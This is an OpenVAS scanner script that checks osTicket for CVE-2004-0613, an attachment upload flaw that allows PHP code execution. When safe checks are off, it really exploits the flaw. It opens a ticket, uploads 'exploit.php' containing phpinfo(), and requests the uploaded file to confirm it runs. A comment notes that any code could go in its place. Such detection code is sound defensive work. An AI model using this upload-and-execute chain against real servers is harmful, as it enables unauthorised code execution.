# OpenVAS Vulnerability Test
# $Id: osticket_attachment_code_execution.nasl 6056 2017-05-02 09:02:50Z teissa $
# Description: osTicket Attachment Code Execution Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>.
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if (description) {
  script_oid("1.3.6.1.4.1.25623.1.0.13645");
  script_version("$Revision: 6056 $");
  script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(10586);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2004-0613");

  script_name("osTicket Attachment Code Execution Vulnerability");
 
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Web application abuses");
  script_dependencies("global_settings.nasl", "http_version.nasl", "no404.nasl", "osticket_detect.nasl");
  script_require_ports("Services/www", 80);

  script_tag(name : "solution" , value : "Apply FileTypes patch or upgrade to osTicket STS 1.2.7 or later.");
  script_tag(name : "summary" , value : "The target is running at least one instance of osTicket that enables a
  remote user to open a new ticket with an attachment containing arbitrary
  PHP code and then to run that code using the permissions of the web
  server user.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
host = http_host_name( port:port );
mailHost = host = get_host_name();

if (debug_level) display("debug: searching for attachment code execution vulnerability in osTicket on ", host, ".\n");

if (get_kb_item("www/no404/" + port)) exit(0);

# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/osticket"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    if (debug_level) display("debug: checking version ", ver, " under ", dir, ".\n");

    # If safe_checks are enabled, rely on the version number alone.
    #
    # nb: this will be a false positive if the patch was applied!
    if (safe_checks()) {
      if (ereg(pattern:"^1\.2\.5$", string:ver)) {
        security_message(port:port);
        exit(0);
      }
    }
    else {
      # Get osTicket's open.php.
      url = string(dir, "/open.php");
      if (debug_level) display("debug: checking ", url, ".\n");
      req = http_get(item:url, port:port);
      res = http_keepalive_send_recv(port:port, data:req);
      if (res == NULL) exit(0);           # can't connect
      if (debug_level) display("debug: res =>>", res, "<<\n");

      # If the form supports attachments...
      if (egrep(pattern:'type="file" name="attachment"', string:res, icase:TRUE)) {
        #  Grab the session cookie.
        pat = "Set-Cookie: (.+); path=";
        matches = egrep(pattern:pat, string:res, icase:TRUE);
        foreach match (split(matches)) {
          match = chomp(match);
          cookie = eregmatch(pattern:pat, string:match);
          if (cookie == NULL) break;
          cookie = cookie[1];
          if (debug_level) display("debug: session cookie =>>", cookie, "<<\n");
        }

        # Open a ticket as long as we have a session cookie.
        if (cookie) {
          boundary = "bound";
          req = string(
            "POST ",  url, " HTTP/1.1\r\n",
            "Host: ", host, "\r\n",
            "Cookie: ", cookie, "\r\n",
            "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
            # nb: we'll add the Content-Length header and post data later.
          );
          boundary = string("--", boundary);
          postdata = string(
            boundary, "\r\n", 
            'Content-Disposition: form-data; name="name"', "\r\n",
            "\r\n",
            "openvas\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="email"', "\r\n",
            "\r\n",
            "postmaster@", mailHost, "\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="phone"', "\r\n",
            "\r\n",
            "\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="cat"', "\r\n",
            "\r\n",
            "4\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="subject"', "\r\n",
            "\r\n",
            "Attachment Upload Test\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="message"', "\r\n",
            "\r\n",
            "Attempt to open a ticket and attach a file with executable code.\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="pri"', "\r\n",
            "\r\n",
            "1\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="MAX_FILE_SIZE"', "\r\n",
            "\r\n",
            "1048576\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="attachment"; filename="exploit.php"', "\r\n",
            "Content-Type: text/plain\r\n",
            "\r\n",
            # NB: This is the actual exploit code; you could put pretty much
            #     anything you want here.
            "<?php phpinfo() ?>\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="submit_x"', "\r\n",
            "\r\n",
            "Open Ticket\r\n",

            boundary, "--", "\r\n"
          );
          req = string(
            req,
            "Content-Length: ", strlen(postdata), "\r\n",
            "\r\n",
            postdata
          );
          if (debug_level) display("debug: sending =>>", req, "<<\n");
          res = http_keepalive_send_recv(port:port, data:req);
          if (res == NULL) exit(0);           # can't connect
          if (debug_level) display("debug: received =>>", res, "<<\n");

          # Grab the ticket number that was issued.
          pat = 'name="login_ticket" .+ value="(.+)">';
          if (matches = egrep(pattern:pat, string:res, icase:TRUE)) {
            foreach match (split(matches)) {
              match = chomp(match);
              ticket = eregmatch(pattern:pat, string:match);
              if (ticket == NULL) break;
              ticket = ticket[1];
              if (debug_level) display("debug: ticket # =>>", ticket, "<<\n");
            }
            if (ticket) {
              # Run the attachment we just uploaded.
              url = string(dir, "/attachments/", ticket, "_exploit.php");
              if (debug_level) display("debug: checking ", url, ".\n");
              req = http_get(item:url, port:port);
              res = http_keepalive_send_recv(port:port, data:req);
              if (res == NULL) exit(0);           # can't connect
              if (debug_level) display("debug: res =>>", res, "<<\n");

              # If we could run it, there's a problem.
              if (egrep(pattern:"200 OK", string:res, icase:TRUE)) {
                desc = "**** OpenVAS successfully opened ticket #" + ticket + " and uploaded\n" +
                    "**** an exploit as " + ticket + "_exploit.php to osTicket's attachment\n" +
                    "**** directory. You are strongly encouraged to delete this attachment\n" +
                    "**** as soon as possible as it can be run by anyone who accesses.\n" +
                    "**** it remotely.";
                security_message(port:port, data:desc);
                exit(0);
              }
            }
          }
        }
      }
    }
  }
}

exit(99);